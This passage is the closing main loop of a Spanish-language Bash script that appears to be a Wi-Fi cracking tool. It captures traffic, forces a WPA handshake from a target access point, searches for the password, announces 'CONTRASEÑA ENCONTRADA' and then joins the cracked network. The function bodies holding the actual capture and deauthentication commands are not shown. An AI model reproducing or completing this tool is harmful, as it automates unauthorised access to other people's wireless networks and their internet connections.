		echo -e ""$verdeC""$parpadeoON"¡¡¡ CONTRASEÑA ENCONTRADA !!! "$parpadeoOFF""$gris" "
		echo
		matar_procesos "Cerrando los procesos abiertos..."

	else
		if [ "$CAP" != "" ]
		then
			echo -e ""$verdeC"El handshake ya fue capturado anteriormente."
			echo
			buscar_clave
		else
			captura_de_paquetes &
			
			esperar_csv
			
			controlar_tamano_captura &
			
			forzar_handshake
			
			matar_procesos "\nCerrando los procesos abiertos..."
			
			rm -rf "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)*"
		
			if [ -e "handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" ]
			then
				buscar_clave
			fi
		fi
	fi

	hora_fin

	calcular_tiempo

	mostrar_clave

	mostrar_duracion

	if [ -f "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
	then
		conectar_internet
	fi

	rm -rf "./$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)*" > /dev/null 2>&1

	pulsar_una_tecla "Pulsa una tecla para seleccionar otra red..."
	
	echo -e $grisC
done

#FIN, THE END, FINITO, SE FINI, etc...
